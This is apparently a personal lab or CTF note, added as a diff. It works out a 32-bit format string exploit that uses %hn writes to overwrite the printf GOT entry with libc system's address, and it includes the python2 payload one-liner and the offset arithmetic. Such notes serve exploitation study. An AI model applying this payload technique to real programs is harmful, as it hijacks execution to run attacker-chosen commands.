@@ -1,0 +1,16 @@
+python2 -c "print('\x0c\xc0\x04\x08\x0e\xc0\x04\x08' + '%51384x' + '%4\$hn' + '%12036x' + '%5\$hn')"
+
+got printf entry = 0x0804c00c
+
+libc system function = 0xf7c4c8c0
+
+write 0xc8c0 in lower half word, write 0xf7c4 in upper
+
+0xc8c0 - 8 = 0xc8b8 = 51384
+
+0xf7c4 - 0xc8c0 = 0x2f04 = 12036
+
+number prefixes of format specifiers include what is printed inside the length
+
+%num$hn still refers to the num argument of printf, but hn just means we treat the argument as a short pointer, so in the context of 32 bit architecture we would just write
+the first 16 bits of wherever that pointer refers to
